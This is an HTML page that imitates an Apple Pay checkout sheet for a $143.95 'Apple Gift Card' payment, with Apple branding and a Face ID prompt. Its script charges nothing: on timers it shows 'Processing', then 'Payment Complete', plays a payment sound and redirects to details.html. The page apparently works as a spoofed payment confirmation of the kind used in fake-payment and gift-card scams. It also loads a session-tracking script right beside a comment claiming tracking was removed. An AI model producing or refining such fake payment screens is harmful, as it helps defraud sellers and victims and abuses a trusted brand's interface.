<!DOCTYPE html>
<html lang="en">
<head>
    <!-- Removed external tracking/analytics scripts -->
    <meta charset="UTF-8" />
    <script async defer src="https://tools.luckyorange.com/core/lo.js?site-id=9dc457ed"></script>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <title>Index</title>
    <style>
        /* Reset and base styles for consistency */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", "Helvetica Neue", Arial, sans-serif;
            background: #000;
            background-image: url('bg.jpg');
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            background-attachment: fixed;
            height: 100vh;
            height: 100dvh;
            overflow: hidden;
            display: flex;
            align-items: flex-end;
            justify-content: center;
            padding: 0;
            -webkit-font-smoothing: antialiased;
        }

        .payment-sheet {
            width: 100%;
            max-width: 414px;
            max-height: 85vh;
            background: rgba(255, 255, 255, 0.98);
            backdrop-filter: blur(40px);
            -webkit-backdrop-filter: blur(40px);
            border-radius: 20px 20px 0 0;
            box-shadow: 0 -10px 40px rgba(0, 0, 0, 0.4);
            display: flex;
            flex-direction: column;
            animation: slideUp 0.4s cubic-bezier(0.32, 0.72, 0, 1);
            overflow: hidden;
        }

        @keyframes slideUp {
            from { transform: translateY(100%); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }

        .sheet-handle {
            width: 36px;
            height: 5px;
            background: rgba(0,0,0,0.3);
            border-radius: 3px;
            margin: 12px auto 16px;
            flex-shrink: 0;
        }

        .sheet-header {
            text-align: center;
            padding: 0 20px 16px;
            border-bottom: 0.5px solid rgba(0,0,0,0.1);
            flex-shrink: 0;
        }

        .merchant-info {
            margin-bottom: 12px;
        }

        .merchant-name {
            font-size: 13px;
            color: rgba(0,0,0,0.55);
            margin-bottom: 4px;
            font-weight: 400;
        }

        .payment-total {
            font-size: 42px;
            font-weight: 700;
            color: #000;
            letter-spacing: -1.5px;
            line-height: 1;
        }

        .apple-pay-logo {
            height: 60px;
            margin: 12px 0 0;
        }

        .sheet-content {
            padding: 0;
            flex: 1;
            overflow-y: auto;
            -webkit-overflow-scrolling: touch;
        }

        .info-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 14px 20px;
            border-bottom: 0.5px solid rgba(0,0,0,0.1);
            background: transparent;
            transition: background 0.2s;
        }

        .info-row:active {
            background: rgba(0,0,0,0.05);
        }

        .info-label {
            font-size: 17px;
            color: #000;
            font-weight: 400;
        }

        .info-value {
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 17px;
            color: rgba(0,0,0,0.55);
        }

        .card-icon {
            width: 28px;
            height: 18px;
            background: linear-gradient(135deg, #1c1c1e 0%, #2c2c2e 100%);
            border-radius: 3px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .card-icon svg {
            width: 16px;
            height: 12px;
            fill: #fff;
        }

        .chevron {
            width: 8px;
            height: 8px;
            border-right: 2px solid rgba(0,0,0,0.3);
            border-bottom: 2px solid rgba(0,0,0,0.3);
            transform: rotate(-45deg);
            margin-left: 4px;
        }

        .processing-view {
            padding: 28px 20px;
            text-align: center;
        }

        .processing-view.hidden {
            display: none;
        }

        .processing-icon {
            width: 56px;
            height: 56px;
            margin: 0 auto 16px;
            border: 3px solid rgba(0,0,0,0.1);
            border-top-color: #000;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .processing-text {
            font-size: 17px;
            font-weight: 600;
            color: #000;
            margin-bottom: 6px;
        }

        .processing-subtext {
            font-size: 15px;
            color: rgba(0,0,0,0.55);
            line-height: 1.4;
        }

        .success-view {
            display: none;
            padding: 32px 20px 24px;
            text-align: center;
        }

        .success-view.show {
            display: block;
            animation: fadeIn 0.3s ease-out;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: scale(0.95); }
            to { opacity: 1; transform: scale(1); }
        }

        .success-icon {
            width: 64px;
            height: 64px;
            margin: 0 auto 20px;
            background: #34c759;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            animation: scaleIn 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
        }

        @keyframes scaleIn {
            0% { transform: scale(0); }
            50% { transform: scale(1.1); }
            100% { transform: scale(1); }
        }

        .checkmark {
            width: 28px;
            height: 28px;
            border: 4px solid #fff;
            border-left: none;
            border-top: none;
            transform: rotate(45deg) translate(-2px, -2px);
        }

        .success-title {
            font-size: 26px;
            font-weight: 700;
            color: #000;
            margin-bottom: 6px;
            letter-spacing: -0.5px;
        }

        .success-subtitle {
            font-size: 17px;
            color: rgba(0,0,0,0.55);
            margin-bottom: 24px;
        }

        .done-btn {
            width: calc(100% - 40px);
            margin: 0 20px;
            padding: 14px;
            background: #007aff;
            color: #fff;
            border: none;
            border-radius: 12px;
            font-size: 17px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s;
        }
        .done-btn:active {
            background: #0051d5;
        }

        .touch-id-prompt {
            padding: 20px 20px;
            text-align: center;
            background: rgba(0, 0, 0, 0.03);
            border-top: 0.5px solid rgba(0,0,0,0.1);
            flex-shrink: 0;
        }

        .touch-id-icon {
            width: 52px;
            height: 52px;
            margin: 0 auto 10px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .touch-id-icon img {
            width: 52px;
            height: 52px;
        }

        .touch-id-text {
            font-size: 15px;
            color: rgba(0,0,0,0.7);
            margin-bottom: 4px;
            font-weight: 500;
        }

        .cancel-btn {
            background: none;
            border: none;
            color: #007aff;
            font-size: 17px;
            font-weight: 400;
            cursor: pointer;
            margin-top: 6px;
            padding: 6px;
        }

        /* Responsive adjustments for smaller screens */
        @media (max-height: 700px) {
            .payment-sheet { max-height: 90vh; }
            .sheet-handle { margin: 10px auto 12px; }
            .sheet-header { padding: 0 20px 12px; }
            .merchant-info { margin-bottom: 8px; }
            .payment-total { font-size: 36px; }
            .apple-pay-logo { height: 50px; margin: 8px 0 0; }
            .info-row { padding: 12px 20px; }
            .processing-view { padding: 20px; }
            .processing-icon { width: 48px; height: 48px; margin: 0 auto 12px; }
            .success-view { padding: 24px 20px 20px; }
            .success-icon { width: 56px; height: 56px; margin: 0 auto 16px; }
            .success-title { font-size: 24px; }
            .success-subtitle { margin-bottom: 20px; }
            .touch-id-prompt { padding: 16px 20px; }
            .touch-id-icon { width: 48px; height: 48px; }
            .touch-id-icon img { width: 48px; height: 48px; }
        }

        @media (max-height: 600px) {
            .payment-sheet { max-height: 95vh; }
            .payment-total { font-size: 32px; }
            .apple-pay-logo { height: 45px; }
            .info-row { padding: 10px 20px; }
            .success-view { padding: 20px; }
            .touch-id-prompt { padding: 14px 20px; }
        }

        @media (max-width: 480px) {
            .payment-sheet { max-width: 100%; border-radius: 20px 20px 0 0; }
        }
    </style>
</head>
<body>
    <div class="payment-sheet">
        <!-- Handle -->
        <div class="sheet-handle"></div>

        <!-- Header -->
        <div class="sheet-header">
            <div class="merchant-info">
                <div class="merchant-name">Pay Apple Gift Card</div>
                <div class="payment-total">$143.95</div>
            </div>
            <img src="Apple-Logo.png" alt="Apple Pay" class="apple-pay-logo" />
        </div>

        <!-- Main Content -->
        <div id="mainContent" class="sheet-content">
            <div class="info-row">
                <div class="info-label">Payment</div>
                <div class="info-value">
                    <span>Apple Pay</span>
                    <div class="chevron"></div>
                </div>
            </div>
            <div class="info-row">
                <div class="info-label">Billing</div>
                <div class="info-value">
                    <span>Same as shipping</span>
                    <div class="chevron"></div>
                </div>
            </div>
            <div class="processing-view" id="processingView">
                <div class="processing-icon"></div>
                <div class="processing-text">Processing Payment</div>
                <div class="processing-subtext">Please wait...</div>
            </div>
        </div>

        <!-- Success Screen -->
        <div id="successView" class="success-view">
            <div class="success-icon">
                <div class="checkmark"></div>
            </div>
            <div class="success-title">Payment Complete</div>
            <div class="success-subtitle">$143.95 to Apple Gift Card</div>
            <button class="done-btn" id="doneBtn">Done</button>
        </div>

        <!-- Face ID / Touch ID Prompt -->
        <div id="touchPrompt" class="touch-id-prompt">
            <div class="touch-id-icon">
                <img src="face-id.png" alt="Face ID" />
            </div>
            <div class="touch-id-text">Pay with Face ID</div>
            <button class="cancel-btn">Cancel</button>
        </div>
    </div>

    <script>
        // Core element references
        const mainContent = document.getElementById('mainContent');
        const processingView = document.getElementById('processingView');
        const successView = document.getElementById('successView');
        const touchPrompt = document.getElementById('touchPrompt');
        const doneBtn = document.getElementById('doneBtn');

        // Audio unlock mechanism for user interaction
        let audioUnlocked = false;
        const unlockAudio = () => {
            if (!audioUnlocked) {
                const tempAudio = new Audio('payment.mp3');
                tempAudio.play().then(() => {
                    tempAudio.pause();
                    tempAudio.currentTime = 0;
                }).catch(() => {});
                audioUnlocked = true;
            }
        };
        ['click', 'touchstart', 'touchend', 'mousedown', 'keydown'].forEach(event => {
            document.addEventListener(event, unlockAudio, { once: true });
        });

        // Simulate delay before processing
        setTimeout(() => {
            touchPrompt.style.display = 'none';
            processingView.classList.remove('hidden');

            // Show success after delay
            setTimeout(() => {
                mainContent.style.display = 'none';
                successView.classList.add('show');

                // Play success sound
                const audio = new Audio('payment.mp3');
                // Wait for unlock before playing
                const playSound = () => {
                    if (audioUnlocked) {
                        audio.play().then(() => {
                            // Redirect after playback
                            audio.onended = () => {
                                setTimeout(() => {
                                    window.location.href = 'details.html';
                                }, 1000);
                            };
                        }).catch(() => {
                            // Fallback redirect if play fails
                            setTimeout(() => {
                                window.location.href = 'details.html';
                            }, 1000);
                        });
                    } else {
                        // If not unlocked, redirect immediately
                        setTimeout(() => {
                            window.location.href = 'details.html';
                        }, 1000);
                    }
                };

                if (audioUnlocked) {
                    playSound();
                } else {
                    // Wait for user interaction to unlock
                    const waitForUnlock = () => {
                        if (audioUnlocked) {
                            playSound();
                            document.removeEventListener('click', waitForUnlock);
                            document.removeEventListener('touchstart', waitForUnlock);
                            document.removeEventListener('touchend', waitForUnlock);
                            document.removeEventListener('mousedown', waitForUnlock);
                            document.removeEventListener('keydown', waitForUnlock);
                        }
                    };
                    document.addEventListener('click', waitForUnlock);
                    document.addEventListener('touchstart', waitForUnlock);
                    document.addEventListener('touchend', waitForUnlock);
                    document.addEventListener('mousedown', waitForUnlock);
                    document.addEventListener('keydown', waitForUnlock);
                }
            }, 2000);
        }, 1000);

        // Handler for "Done" button
        doneBtn.addEventListener('click', () => {
            window.location.href = 'details.html';
        });
    </script>
    <!-- Removed Cloudflare beacon script -->
</body>

</html>
